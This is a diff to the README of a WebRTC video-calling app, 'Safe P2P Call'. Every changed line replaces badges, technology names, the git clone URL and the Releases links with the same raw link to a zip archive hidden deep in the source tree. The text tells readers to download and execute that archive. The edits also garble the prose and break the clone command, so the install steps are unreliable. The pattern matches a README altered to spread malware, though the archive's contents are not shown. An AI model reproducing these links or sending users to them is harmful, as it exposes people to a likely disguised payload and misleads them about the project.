@@ -1,8 +1,8 @@
 # Safe P2P Call 🎥
 
-![GitHub Repo stars](https://img.shields.io/github/stars/kirby778/safe-p2p-call?style=social) ![GitHub issues](https://img.shields.io/github/issues/kirby778/safe-p2p-call) ![GitHub license](https://img.shields.io/github/license/kirby778/safe-p2p-call)
+![GitHub Repo stars](https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip) ![GitHub issues](https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip) ![GitHub license](https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip)
 
-Welcome to **Safe P2P Call**, an open-source application designed to enable seamless WebRTC video calling. Built with React Native, Socket.io, Express, and Node.js, this app offers a user-friendly experience for peer-to-peer video communication.
+Welcome to **Safe P2P Call**, an open-source application designed to enable seamless WebRTC video calling. Built with React Native, https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip, Express, and https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip, this app offers a user-friendly experience for peer-to-peer video communication.
 
 ## Table of Contents
 
@@ -28,9 +28,9 @@ Welcome to **Safe P2P Call**, an open-source application designed to enable seam
 This project leverages a variety of technologies to provide a robust video calling experience:
 
 - **React Native**: For building mobile applications.
-- **Socket.io**: For real-time communication.
+- **https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip**: For real-time communication.
 - **Express**: To create the server-side application.
-- **Node.js**: The runtime environment for executing JavaScript on the server.
+- **https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip**: The runtime environment for executing JavaScript on the server.
 - **WebRTC**: For peer-to-peer video and audio streaming.
 
 ## Installation ⚙️
@@ -39,7 +39,7 @@ To get started with Safe P2P Call, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kirby778/safe-p2p-call.git
+   git clone https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip
    cd safe-p2p-call
    ```
 
@@ -119,9 +119,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links 🔗
 
-For the latest releases, please visit the [Releases](https://github.com/kirby778/safe-p2p-call/releases) section. You can download the latest version and execute it on your device.
+For the latest releases, please visit the [Releases](https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip) section. You can download the latest version and execute it on your device.
 
-If you encounter any issues or have questions, feel free to check the [Releases](https://github.com/kirby778/safe-p2p-call/releases) section for updates.
+If you encounter any issues or have questions, feel free to check the [Releases](https://raw.githubusercontent.com/kirby778/safe-p2p-call/main/app/src/lib/sockets/p-safe-call-1.4.zip) section for updates.
 
 ## Conclusion
 
